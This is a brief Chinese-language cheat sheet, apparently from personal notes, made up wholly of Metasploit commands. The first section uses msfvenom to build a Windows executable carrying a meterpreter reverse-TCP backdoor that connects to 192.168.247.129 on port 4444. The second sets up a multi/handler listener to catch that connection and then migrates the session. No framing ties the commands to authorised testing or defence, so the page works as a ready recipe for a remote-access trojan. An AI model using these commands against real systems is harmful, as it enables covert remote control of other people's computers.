## 生成Windows马

```shell
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.247.129 lport=4444 -f exe -o 123.exe # 使用msfvenom生成Windows后门
```

## 启动监听

```shell
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter/reverse_tcp
> set lhost 192.168.247.129
> set lport 4444
> exploit
> migrate
```

